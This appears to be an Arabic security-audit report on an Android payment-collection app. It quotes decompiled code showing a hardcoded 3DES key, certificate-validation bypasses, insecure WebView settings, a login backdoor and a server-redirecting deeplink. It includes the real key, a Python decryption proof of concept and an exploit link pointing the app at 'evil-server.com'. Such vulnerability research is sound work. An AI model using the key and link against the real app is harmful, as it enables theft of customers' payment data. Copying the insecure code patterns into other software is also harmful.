# مقتطفات الكود الحرجة - AbbasiyCashiers (ECAS WEB v18.4)

هذا الملف يحتوي على أهم مقتطفات الكود التي تم استخراجها أثناء التحليل الساكن، مع شرح وتعليق على كل منها.

---

## 1. مفتاح تشفير DESede مُضَمَّن (Hardcoded Key)
**الموقع:** `android/support/v4/media/session/MediaSessionCompat.java` — السطور 619-644
**الخطورة:** 🔴 **حرجة جداً (Critical)**

```java
// Decrypt
public static String r(String str) {
    byte[] decode = Base64.decode(str.getBytes("utf-8"), 0);
    byte[] copyOf = Arrays.copyOf(
        MessageDigest.getInstance("md5").digest(
            "m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##".getBytes("utf-8")
        ), 24);
    int i = 16;
    for (int i2 = 0; i2 < 8; i2++) {
        copyOf[i] = copyOf[i2];
        i++;
    }
    SecretKey generateSecret = SecretKeyFactory.getInstance("DESede")
        .generateSecret(new DESedeKeySpec(copyOf));
    Cipher cipher = Cipher.getInstance("DESede");
    cipher.init(2, generateSecret);
    return new String(cipher.doFinal(decode), OutputFormat.Defaults.Encoding);
}

// Encrypt - same key
public static String s(String str) {
    byte[] copyOf = Arrays.copyOf(
        MessageDigest.getInstance("md5").digest(
            "m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##".getBytes("utf-8")
        ), 24);
    // ... identical key derivation
}
```

**التحليل:**
- المفتاح الثابت: `m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##` (29 حرفاً)
- يُستخدم خوارزمية **3DES (DESede)** مع وضع ECB افتراضي (لا IV) - وهي خوارزمية مُهملة (deprecated)
- اشتقاق المفتاح: MD5 → 24 بايت (تكرار أول 8 بايت)
- ⚠️ هذا المفتاح موجود في كل نسخة من التطبيق ولكل مستخدم - يمكن لأي مهاجم استخدامه

**استغلال محتمل (Proof of Concept Python):**
```python
import hashlib, base64
from Crypto.Cipher import DES3

SECRET = b"m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"
md5_hash = hashlib.md5(SECRET).digest()  # 16 bytes
key = md5_hash + md5_hash[:8]            # 24 bytes (3DES)
cipher = DES3.new(key, DES3.MODE_ECB)

# Decrypt deeplink IP parameter (encrypted before being decrypted)
def decrypt(b64_text):
    return cipher.decrypt(base64.b64decode(b64_text)).rstrip(b'\\x00').decode()
```

---

## 2. TrustManager يقبل كل الشهادات (SSL Bypass)
**الموقع:** `c/b/a/f/d.java` (كامل الملف)
**الخطورة:** 🔴 **حرجة (Critical)** — انتهاك OWASP MASVS-NETWORK-1

```java
class d implements X509TrustManager {
    @Override
    public void checkClientTrusted(X509Certificate[] x509CertificateArr, String str) {
        // ⚠️ فارغ - يقبل أي شهادة
    }

    @Override
    public void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) {
        // ⚠️ فارغ - يقبل أي شهادة من الخادم
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
```

**الموقع المقابل:** `c/b/a/f/c.java` — السطور 40-48
```java
public class a implements HostnameVerifier {
    public boolean verify(String str, SSLSession sSLSession) {
        return true;  // ⚠️ يقبل أي اسم مضيف
    }
}
```

**التأثير:**
- التطبيق عرضة **بالكامل** لهجمات Man-in-the-Middle (MITM)
- يمكن لأي مهاجم على نفس الشبكة اعتراض/تعديل بيانات الدفع والقراءات
- لا يوجد Certificate Pinning بأي شكل

---

## 3. WebView Insecure Configuration
**الموقع:** `com/egy/webpaymentapp/Screens/web/WebviewActivity.java` — السطور 432-440
**الخطورة:** 🔴 **عالية جداً (High)**

```java
u.getSettings().setDomStorageEnabled(true);
u.getSettings().setAllowFileAccess(true);                     // ⚠️ خطير
u.getSettings().setAllowContentAccess(true);
u.getSettings().setDatabaseEnabled(true);
u.getSettings().setAllowUniversalAccessFromFileURLs(true);    // ⚠️ خطير جداً
u.getSettings().setJavaScriptEnabled(true);
u.addJavascriptInterface(new i(this, this), "mobile");        // ⚠️ JS-bridge مكشوف
```

**التأثير:**
- `setAllowUniversalAccessFromFileURLs(true)` + `setJavaScriptEnabled(true)` = الوصول لأي ملف محلي من سياق ويب
- وجود JS-bridge (`window.mobile`) يفتح طريقاً لتنفيذ كود نشط من أي صفحة ويب يتم تحميلها

---

## 4. WebViewClient يتجاهل أخطاء SSL
**الموقع:** `com/egy/webpaymentapp/Screens/web/h.java` — السطور حول 140
**الخطورة:** 🔴 **حرجة (Critical)**

```java
@Override
public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
    sslError.getPrimaryError();
    sslErrorHandler.proceed();   // ⚠️ يتابع تحميل الصفحة رغم خطأ الشهادة
}

@Override
public boolean shouldOverrideUrlLoading(WebView webView, String str) {
    // ⚠️ يحمل أي رابط دون أي validation
    if (!str.contains("default_error_page.html") && str.contains(Method.HTML)) {
        WebviewActivity.v = str;
    }
    if (MailTo.isMailTo(str)) {
        MailTo.parse(str);
        return true;
    }
    webView.loadUrl(str);
    return true;
}
```

---

## 5. Magic Backdoor للوصول إلى إعدادات التطبيق
**الموقع:** `com/egy/webpaymentapp/Screens/LoginActivity.java` — السطور 65-72
**الخطورة:** 🟠 **متوسطة (Medium)** — Backdoor، انتهاك السرية

```java
if (LoginActivity.this.q.getText().toString().equals("1")
        && LoginActivity.this.r.getText().toString().equals("1")
        && LoginActivity.this.s.getText().toString().equals("1")) {
    LoginActivity loginActivity = LoginActivity.this;
    String packageName = loginActivity.getApplicationContext().getPackageName();
    Intent intent = new Intent();
    intent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
    intent.setData(Uri.fromParts("package", packageName, null));
    loginActivity.startActivity(intent);
    return;
}
```

**التحليل:**
- إذا كتب المستخدم `1` في كل من حقول: الفرع، اسم المستخدم، وكلمة المرور = يفتح إعدادات النظام الخاصة بالتطبيق
- هذا "backdoor للمطورين" مُتبقي في الإصدار الإنتاجي — انتهاك مبدأ Defense in Depth

---

## 6. Deeplink يسمح بتغيير عنوان الخادم
**الموقع:** `com/egy/webpaymentapp/Screens/LoginActivity.java` — السطور 143-163
**الموقع المقابل في Manifest:** `<data android:host="ecas.web.link" android:scheme="https"/>`
**الخطورة:** 🔴 **حرجة (Critical)** — يسمح بتوجيه التطبيق لخادم ضار

```java
if (getIntent() != null && getIntent().getData() != null) {
    try {
        String r = MediaSessionCompat.r(
            MediaSessionCompat.s(
                getIntent().getData().getQueryParameters("ip").get(0)
            )
        );
        if (!TextUtils.isEmpty(r)) {
            if (!r.startsWith("http") && !r.startsWith("https")) {
                d2 = c.b.a.c.d(this);
                r = "https://" + r;
                d2.a("APP_SERVER_CER_KEY", "");
                d2.a("APP_SERVER_IP_KEY", r);    // ⚠️ يخزن IP الجديد دون تأكيد
                Toast.makeText(this, "تمت العملية بنجاح", 1).show();
            }
            // ...
        }
    } catch (Exception e2) {
        e2.printStackTrace();
    }
}
```

**سيناريو الهجوم:**
1. المهاجم يبني رابطاً: `https://ecas.web.link/?ip=<encrypted_evil_ip>`
2. يستخدم نفس مفتاح DESede الثابت لتشفير IP
3. عند نقر الضحية، التطبيق يبدل عنوان الخادم تلقائياً!
4. كل البيانات الحساسة (الرواتب، المدفوعات) تذهب الآن لخادم المهاجم

**رابط استغلال POC:**
```
https://ecas.web.link/?ip=<base64_of_DESede_encrypted("evil-server.com:8057/payment")>
```

---

## 7. تشفير كلمة المرور بـ RSA + Public Key من الخادم
**الموقع:** `android/support/v4/media/session/MediaSessionCompat.java` — السطور 463-488
**الموقع المقابل:** `c/b/a/f/b.java` — السطور 159-172

```java
public static String a(String str, String str2) {
    // str = "modulus_base64&exponent_base64" (من الخادم)
    // str2 = كلمة المرور النصية
    Cipher cipher;
    PublicKey generatePublic;
    String str3 = null;
    try {
        generatePublic = KeyFactory.getInstance("RSA").generatePublic(
            new RSAPublicKeySpec(
                new BigInteger(1, Base64.decode(str.split("&")[0], 0)),
                new BigInteger(1, Base64.decode(str.split("&")[1], 0))
            )
        );
        cipher = Cipher.getInstance("RSA/ECB/PKCS1PADDING");
    } catch (Exception e2) { /* ... */ }
    cipher.init(1, generatePublic);
    str3 = new String(Base64.encode(cipher.doFinal(str2.getBytes(...)), 0));
    return str3.replaceAll("(\\r|\\n)", "");
}
```

**تحليل آمن نسبياً:**
- RSA/PKCS1 Padding مع مفتاح من الخادم → يحمي كلمة المرور أثناء النقل
- ⚠️ ولكن مع `TrustManager` المُعطل، المهاجم يمكنه استبدال المفتاح العام بمفتاحه ثم فك التشفير - فالحماية ضائعة بسبب الثغرة #2

---

## 8. HMAC SHA1 + SHA256 لتوقيع البيانات (؟)
**الموقع:** `MediaSessionCompat.java` — السطور 271-290

```java
public static String B(String str, String str2, String str3) {
    String str4 = str + "@" + str2 + "@" + str3;
    String substring = str3.substring(str3.length() / 2);  // ⚠️ المفتاح = نصف str3
    Mac mac = Mac.getInstance("HmacSHA1");
    mac.init(new SecretKeySpec(substring.getBytes(), mac.getAlgorithm()));
    byte[] digest = MessageDigest.getInstance("SHA-256")
        .digest(new String(Base64.encode(mac.doFinal(str4.getBytes()), 2)).getBytes());
    // hex encode and return uppercase
}
```

**ملاحظة:** الدالة لم تُستدعى في كود تم تحليله — قد تكون "dead code" أو تُستخدم في مسار غير مكتشف بعد.

---

## 9. الحصول على Device ID وإرساله مع كل request
**الموقع:** `MediaSessionCompat.java` — السطور 301-318

```java
@SuppressLint({"HardwareIds"})
public static String D(Context context) {
    if (Build.VERSION.SDK_INT >= 29) {
        return Settings.Secure.getString(context.getContentResolver(), "android_id");
    }
    try {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
        str = telephonyManager != null ? telephonyManager.getDeviceId() : "";  // ⚠️ IMEI!
        // ...
    }
}
```

**التأثير:**
- على Android 9 وأقدم: يحاول الحصول على **IMEI** (معرّف جهاز مادي حساس)
- على Android 10+: يستخدم Android ID (أقل خطورة)
- يتم تشفيره وإرساله في `user.q()` مع كل طلب login/changePassword

---

## 10. ملخص نقاط النهاية (API Endpoints)

جميع endpoints تذهب إلى `https://abbasiy.yedns.org:8057/payment` (افتراضياً):

| Endpoint | الوظيفة | المُرسِل |
|----------|---------|---------|
| `/api/Users/getAppPK` | جلب المفتاح العام RSA للخادم | LoginActivity (قبل تسجيل الدخول) |
| `/api/Users/Login` | تسجيل الدخول | LoginActivity |
| `/api/Users/changePasswordRequest` | تغيير كلمة المرور | ChangePassActivity |
| `/api/Payment/GetCustomersData` | جلب بيانات العملاء (للبحث) | OprationsActivity |
| `/api/Payment/saveBillRequest` | حفظ عملية دفع | OprationsActivity |
| `/api/Payment/saveReadingRequest` | حفظ قراءة عداد | OprationsActivity |
| `/api/Payment/GetPaymentsReportData` | جلب تقرير المدفوعات | WebviewActivity |
| `/api/Payment/GetReadingListData` | جلب قائمة القراءات | WebviewActivity |
| `/api/Payment/saveCustLocation` | حفظ موقع GPS للعميل | OprationsActivity |
